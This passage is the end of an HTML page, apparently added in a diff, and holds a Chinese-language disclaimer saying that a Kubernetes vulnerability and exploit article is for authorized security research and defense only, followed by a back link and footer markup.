+<p>本文仅供安全研究和技术学习使用。文中涉及的漏洞利用技术、PoC 代码和攻击链分析仅用于防御目的，帮助安全从业者理解 Kubernetes 生态的安全风险并制定防御策略。请勿将本文内容用于任何非法用途。所有漏洞信息均来自公开披露的 GitHub Security Advisory 和 NVD。相关漏洞已在受影响产品的最新版本中修复。读者应在合法授权的环境下进行安全测试，并遵守当地法律法规。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
